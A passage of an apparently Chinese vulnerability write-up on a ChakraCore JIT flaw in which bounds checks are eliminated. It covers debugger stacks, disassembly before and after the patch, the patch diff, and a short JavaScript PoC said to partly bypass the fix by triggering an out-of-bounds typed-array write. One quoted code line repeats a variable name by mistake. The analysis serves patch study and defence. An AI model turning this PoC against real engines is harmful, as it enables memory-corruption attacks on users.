scriptContext, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper)&#123;...&#125;)</span><br><span class="line"> 29     ChakraCore.dll!RunScriptCore(void * scriptSource=0x00000195982bc000, const unsigned char * script=0x0000018d967278e0, unsigned __int64 cb=266, LoadScriptFlag loadScriptFlag=LoadScriptFlag_Utf8Source | LoadScriptFlag_ExternalArrayBuffer, unsigned __int64 sourceContext=0, const wchar_t * sourceUrl=0x0000018d9682c1c0, bool parseOnly=false, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, bool isSourceModule=false, void * * result=0x0000000000000000)</span><br><span class="line"> 30     ChakraCore.dll!CompileRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000, bool parseOnly=false)</span><br><span class="line"> 31     ChakraCore.dll!JsRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 32     ch.exe!ChakraRTInterface::JsRun(void * script=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 33     ch.exe!RunScript(const char * fileName=0x0000018d9673df50, const char * fileContents=0x0000018d967278e0, void * bufferValue=0x0000000000000000, char * fullPath=0x0000002e3a7ffa70)</span><br><span class="line"> 34     ch.exe!ExecuteTest(const char * fileName=0x0000018d9673df50)</span><br><span class="line"> 35     ch.exe!ExecuteTestWithMemoryCheck(char * fileName=0x0000018d9673df50)</span><br><span class="line"> 36     ch.exe!StaticThreadProc(void * lpParam=0x0000002e3a17fba8)</span><br><span class="line"> 37     ch.exe!invoke_thread_procedure(unsigned int(*)(void *) procedure=0x00007ff7d84647d0, void * const context=0x0000002e3a17fba8)</span><br><span class="line"> 38     ch.exe!thread_start&lt;unsigned int (__cdecl*)(void * __ptr64)&gt;(void * const parameter=0x0000018d9673ea70)</span><br><span class="line"> 39     [外部代码]</span><br></pre></td></tr></table></figure></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-072024.jpg" alt=""><br>关于JIT生成不是重点，于是我调试了一下并没有详细写出调用，只是说一下。<br>在循环的解释执行次数超出loopInterpretCount的值的时候，就会进入JIT代码生成，然后在JIT代码生成后就转到JIT中执行，不再解释执行。</p><p>在JIT优化之后，DoLoopBodyStart调用CallLoopBody，参数是循环体JIT代码的地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071023.jpg" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fn-&gt;GetIsAsmJsFunction())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="function">AutoRestoreLoopNumbers <span class="title">autoRestore</span><span class="params">(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck)</span></span>;</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallAsmJsLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                AutoRestoreLoopNumbers autoRestore(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck);</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>漏洞触发在循环体中</p><h4 id="分析patch前汇编"><a href="#分析patch前汇编" class="headerlink" title="分析patch前汇编"></a>分析patch前汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0000018D96940138  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">0000018D9694013E  inc         ecx  </span><br><span class="line">0000018D96940140  cmp         r9d,r10d ----&gt;检查begin是否小于end</span><br><span class="line">0000018D96940143  jge         0000018D96940181  </span><br><span class="line">0000018D96940145  mov         r11,r14  </span><br><span class="line">0000018D96940148  mov         r13,r11  </span><br><span class="line">0000018D9694014B  shr         r13,30h  </span><br><span class="line">0000018D9694014F  cmp         r13,1  </span><br><span class="line">0000018D96940153  jne         0000018D9694032F  </span><br><span class="line">0000018D96940159  mov         r13d,r11d  </span><br><span class="line">0000018D9694015C  mov         dword ptr [rsi+r9*4],r13d ----&gt;对数组元素赋值</span><br></pre></td></tr></table></figure><p><code>mov         dword ptr [rsi+r9*4],r13d</code>是对view数组元素赋值，rsi是buffer的首地址,r9是数组索引值i,r13d即1851880825(hex:0x6E617579)是要赋的值</p><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071054.jpg" alt=""><br>由汇编可以看出，缺少对索引值的边界检查（或者说优化后只剩下了检查begin是否小于end，但是没有检查索引上界end是否超出数组内存边界）<br>于是就访问到了不能访问的地址,crash。</p><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><ul><li>patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Too aggressive bound check removal</span><br><span class="line">Don&apos;t eliminate bounds checks on virtual typed arrays if we can&apos;t guarantee that the accesses will be within 4Gb</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">-            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">-            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+            <span class="comment">// Unless we're in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</span></span><br><span class="line">+            <span class="comment">// check the range of the index to make sure we won't access beyond the reserved memory beforing eliminating bounds</span></span><br><span class="line">+            <span class="comment">// checks in jitted code.</span></span><br><span class="line">+            <span class="keyword">if</span> (!GetIsAsmJSFunc())</span><br><span class="line">+            &#123;</span><br><span class="line">+                IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</span><br><span class="line">+                <span class="keyword">if</span> (idxOpnd)</span><br><span class="line">+                &#123;</span><br><span class="line">+                    StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(<span class="literal">nullptr</span>) : idxOpnd-&gt;m_sym;</span><br><span class="line">+                    Value * idxValue = FindValue(idxSym);</span><br><span class="line">+                    IntConstantBounds idxConstantBounds;</span><br><span class="line">+                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">+                    &#123;</span><br><span class="line">+                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">+                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">+                        int32 lowerBound = idxConstantBounds.LowerBound();</span><br><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &#125;</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+            <span class="keyword">else</span></span><br><span class="line">+            &#123;</span><br><span class="line">+                eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure><p>要分析patch，可以先看一下patch后现在的JIT代码是什么样，跟进JIT。<br>在这下个断点，跟到JIT里<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071206.jpg" alt=""><br>再在JIT里下断点<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071218.jpg" alt=""><br>继续执行到断点，并单步跟进<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071241.jpg" alt=""></p><h4 id="分析patch后汇编"><a href="#分析patch后汇编" class="headerlink" title="分析patch后汇编"></a>分析patch后汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960000  mov         rax,1DFAB6B0A78h  </span><br><span class="line">000001E8AB96000A  mov         rax,qword ptr [rax]  </span><br><span class="line">000001E8AB96000D  add         rax,1C20h  </span><br><span class="line">000001E8AB960014  jo          000001E8AB960376  </span><br><span class="line">000001E8AB96001A  cmp         rsp,rax  </span><br><span class="line">000001E8AB96001D  jle         000001E8AB960376  </span><br><span class="line">000001E8AB960023  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB960027  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB96002B  mov         qword ptr [rsp+20h],r9  </span><br><span class="line">000001E8AB960030  mov         qword ptr [rsp+18h],r8  </span><br><span class="line">000001E8AB960035  mov         qword ptr [rsp+10h],rdx  </span><br><span class="line">000001E8AB96003A  mov         qword ptr [rsp+8],rcx  </span><br><span class="line">000001E8AB96003F  push        rbp  </span><br><span class="line">000001E8AB960041  mov         rbp,rsp  </span><br><span class="line">000001E8AB960044  sub         rsp,30h  </span><br><span class="line">000001E8AB960048  push        r15  </span><br><span class="line">000001E8AB96004A  push        r14  </span><br><span class="line">000001E8AB96004C  push        r13  </span><br><span class="line">000001E8AB96004E  push        r12  </span><br><span class="line">000001E8AB960050  push        rdi  </span><br><span class="line">000001E8AB960052  push        rsi  </span><br><span class="line">000001E8AB960054  push        rbx  </span><br><span class="line">000001E8AB960056  sub         rsp,28h  </span><br><span class="line">000001E8AB96005A  mov         rbx,1DFAB6701C0h  </span><br><span class="line">000001E8AB960064  mov         rsi,7FFA484B2198h  </span><br><span class="line">000001E8AB96006E  mov         rdi,1E7AB7C47C4h  </span><br><span class="line">000001E8AB960078  mov         r12,qword ptr [rbp+20h]  </span><br><span class="line">000001E8AB96007C  mov         r13,qword ptr [r12+160h]  </span><br><span class="line">000001E8AB960084  mov         r14,qword ptr [r12+168h]  </span><br><span class="line">000001E8AB96008C  mov         r15,qword ptr [r12+158h]  </span><br><span class="line">000001E8AB960094  mov         rax,qword ptr [r12+170h]  </span><br><span class="line">000001E8AB96009C  xor         ecx,ecx  </span><br><span class="line">000001E8AB96009E  mov         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600A5  mov         byte ptr [rbx+41BBAh],3  </span><br><span class="line">000001E8AB9600AC  mov         rdx,qword ptr [rdi+1784Ch]  </span><br><span class="line">000001E8AB9600B3  mov         rdx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB9600B7  mov         byte ptr [rbx+41BBAh],0  </span><br><span class="line">000001E8AB9600BE  cmp         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600C5  jne         000001E8AB9601CE  </span><br><span class="line">000001E8AB9600CB  mov         r8,r13  </span><br><span class="line">000001E8AB9600CE  mov         r9,r8  </span><br><span class="line">000001E8AB9600D1  shr         r9,30h  </span><br><span class="line">000001E8AB9600D5  cmp         r9,1  </span><br><span class="line">000001E8AB9600D9  jne         000001E8AB9601E4  </span><br><span class="line">000001E8AB9600DF  mov         r8d,r8d  </span><br><span class="line">000001E8AB9600E2  mov         r9,rax  </span><br><span class="line">000001E8AB9600E5  mov         r10,r9  </span><br><span class="line">000001E8AB9600E8  shr         r10,30h  </span><br><span class="line">000001E8AB9600EC  cmp         r10,1  </span><br><span class="line">000001E8AB9600F0  jne         000001E8AB960231  </span><br><span class="line">000001E8AB9600F6  mov         r9d,r9d  </span><br><span class="line">000001E8AB9600F9  mov         r10,r15  </span><br><span class="line">000001E8AB9600FC  mov         r11,r10  </span><br><span class="line">000001E8AB9600FF  shr         r11,30h  </span><br><span class="line">000001E8AB960103  cmp         r11,1  </span><br><span class="line">000001E8AB960107  jne         000001E8AB96028A  </span><br><span class="line">000001E8AB96010D  mov         r10d,r10d  </span><br><span class="line">000001E8AB960110  mov         r11,rdx  </span><br><span class="line">000001E8AB960113  shr         r11,30h  </span><br><span class="line">000001E8AB960117  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB96011D  cmp         qword ptr [rdx],rsi  </span><br><span class="line">000001E8AB960120  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB960126  mov         esi,dword ptr [rdx+20h]  </span><br><span class="line">000001E8AB960129  cmp         r10d,esi  ----&gt;比较索引上界是否超出数组内存边界（检查上界）</span><br></pre></td></tr></table></figure><ul><li>比较索引上界是否超出数组长度（检查上界）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071601.jpg" alt=""></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB96012C  jg          000001E8AB9602F7  </span><br><span class="line">000001E8AB960132  mov         rbx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB960136  mov         rsi,1DFAB6B0A78h  </span><br><span class="line">000001E8AB960140  cmp         rsp,qword ptr [rsi]  </span><br><span class="line">000001E8AB960143  jle         000001E8AB96032A  </span><br><span class="line">000001E8AB960149  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">000001E8AB96014F  inc         ecx  </span><br><span class="line">000001E8AB960151  cmp         r9d,r10d  -----&gt;比较索引值是否到达索引上界</span><br></pre></td></tr></table></figure><ul><li><p>比较索引值是否到达索引上界<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071716.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960154  jge         000001E8AB96019A  </span><br><span class="line">000001E8AB960156  test        r9d,r9d  </span><br><span class="line">000001E8AB960159  js          000001E8AB96033C  </span><br><span class="line">000001E8AB96015F  mov         rsi,r14  </span><br><span class="line">000001E8AB960162  mov         r11,rsi  </span><br><span class="line">000001E8AB960165  shr         r11,30h  </span><br><span class="line">000001E8AB960169  cmp         r11,1  </span><br><span class="line">000001E8AB96016D  jne         000001E8AB960358  </span><br><span class="line">000001E8AB960173  mov         esi,esi  </span><br><span class="line">000001E8AB960175  mov         dword ptr [rbx+r9*4],esi  -----&gt;数组赋值</span><br></pre></td></tr></table></figure></li><li><p>数组赋值<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071642.jpg" alt=""></p></li></ul><h4 id="关于patch的思考"><a href="#关于patch的思考" class="headerlink" title="关于patch的思考"></a>关于patch的思考</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br></pre></td></tr></table></figure><p>要绕过patch再次触发就要进入这个if body，(static_cast<uint64>(upperBound) &lt;&lt; indirScale)的限制是要小于4GB，这应该和内存分配有关。<br><code>var buffer = new ArrayBuffer(0x10000);</code><br>能否在进入if body的同时，又能OOB超出数组长度，就是后面需要思考的问题。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IntConstantBounds idxConstantBounds;</span><br><span class="line">                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">                    &#123;</span><br><span class="line">                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">                        int32 upperBound = idxConstantBounds.LowerBound();</span><br></pre></td></tr></table></figure></uint64></p><p>该段代码表示了程序试图获取ConstantBounds来赋值给idxConstantBounds从而控制upperBound&amp;lowerBound<br>因此PoC中需要构造常数边界来控制upperBound&amp;upperBound从而控制下列判断：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//回溯分析</span><br><span class="line">//rax = idxOpnd</span><br><span class="line">//if (idxOpnd) </span><br><span class="line">//idxSym = idxOpnd-&gt;m_sym;</span><br><span class="line">        //&#123;</span><br><span class="line">                    //test rax,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rax+8]</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rcx,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //StackSym::GetTypeEquivSym(IRType type, Func *func)</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rcx+30h]</span><br><span class="line">        //&#125;</span><br><span class="line">//Value * idxValue = FindValue(idxSym); //rax</span><br><span class="line">//IntConstantBounds idxConstantBounds; //rax</span><br><span class="line">//if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds)) //rax</span><br></pre></td></tr></table></figure><p>经过测试，在patch了的函数那里下断，跟进到这个if判断,得到有限制的bypass patch PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">j,number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++) <span class="comment">//create jit code</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=<span class="number">0</span> &amp;&amp; j&lt;=<span class="number">0x6000000</span>) view[j]=number;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x1234</span>,<span class="number">1</span>) <span class="comment">//jit create</span></span><br><span class="line">write(<span class="number">0x123456</span>,<span class="number">1</span>) <span class="comment">//bypass(limited) patch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mov     r8,qword ptr [rbp-78h]= 0600000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//R8  = 06000000 00000000</span></span><br><span class="line"><span class="comment">//       high      low</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//test        r8d,r8d   r8d=0</span></span><br><span class="line"><span class="comment">//shr         r8,20h    r8=0x0000000006000000</span></span><br><span class="line"><span class="comment">//movsxd      rdx,r8d   rdx=0x06000000</span></span><br><span class="line"><span class="comment">//movzx       ecx,al    al=2</span></span><br><span class="line"><span class="comment">//shl         rdx,cl </span></span><br><span class="line"><span class="comment">//mov         rax,100000000h </span></span><br><span class="line"><span class="comment">//cmp         rdx,rax</span></span><br></pre></td></tr></table></figure></p><h3 id="更多的思考"><a href="#更多的思考" class="headerlink" title="更多的思考"></a>更多的思考</h3><p><del>chakra为什么这么优化，它涉及怎样的一个pattern，这样优化和buffer相关的点有哪些？</del></p><ol><li>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）</li><li>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?</li></ul><h3 id="JIT优化-amp-amp-内存分配"><a href="#JIT优化-amp-amp-内存分配" class="headerlink" title="JIT优化&amp;&amp;内存分配"></a>JIT优化&amp;&amp;内存分配</h3><p>经过进一步对内存分配的调试（首先我在windbg里对windows API下断,参考了<a href="https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/" target="_blank" rel="noopener">这篇</a>，然后回溯确实跟到了VirtualAlloc，不过和我找的不是同一个。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-031720.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; bp KERNEL32!VirtualAllocStub</span><br><span class="line">0:000&gt; g</span><br><span class="line">ModLoad: 00007ffc`0e250000 00007ffc`0fc52000   D:\chakracore\ChakraCore\Build\VcBuild\bin\x64_debug\chakracore.dll</span><br><span class="line">ModLoad: 00007ffc`55f90000 00007ffc`560d5000   C:\windows\System32\ole32.dll</span><br><span class="line">ModLoad: 00007ffc`54030000 00007ffc`54057000   C:\windows\System32\GDI32.dll</span><br><span class="line">ModLoad: 00007ffc`529c0000 00007ffc`52b47000   C:\windows\System32\gdi32full.dll</span><br><span class="line">ModLoad: 00007ffc`53780000 00007ffc`538ca000   C:\windows\System32\USER32.dll</span><br><span class="line">ModLoad: 00007ffc`529a0000 00007ffc`529be000   C:\windows\System32\win32u.dll</span><br><span class="line">ModLoad: 00007ffc`53f10000 00007ffc`53f69000   C:\windows\System32\sechost.dll</span><br><span class="line">ModLoad: 00007ffc`53b90000 00007ffc`53c31000   C:\windows\System32\ADVAPI32.dll</span><br><span class="line">ModLoad: 00007ffc`406c0000 00007ffc`40869000   C:\windows\SYSTEM32\dbghelp.dll</span><br><span class="line">ModLoad: 00007ffc`40b50000 00007ffc`40b79000   C:\windows\SYSTEM32\dbgcore.DLL</span><br><span class="line">ModLoad: 00007ffc`54190000 00007ffc`541bd000   C:\windows\System32\IMM32.DLL</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">KERNEL32!VirtualAllocStub:</span><br><span class="line">00007ffc`53f99800 48ff2569c60500  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffc`53ff5e70)] ds:00007ffc`53ff5e70=&#123;KERNELBASE!VirtualAlloc (00007ffc`532aafc0)&#125;</span><br><span class="line">…</span><br><span class="line">0:000&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 00000030`208fec08 00007ffc`0e34bfe2 KERNEL32!VirtualAllocStub</span><br><span class="line">01 00000030`208fec10 00007ffc`0e252610 chakracore!Memory::X64WriteBarrierCardTableManager::Initialize+0x82 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 232] </span><br><span class="line">02 00000030`208fec70 00007ffc`0f0e647d chakracore!`dynamic initializer for &apos;Memory::RecyclerWriteBarrierManager::cardTable&apos;&apos;+0x10 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 29] 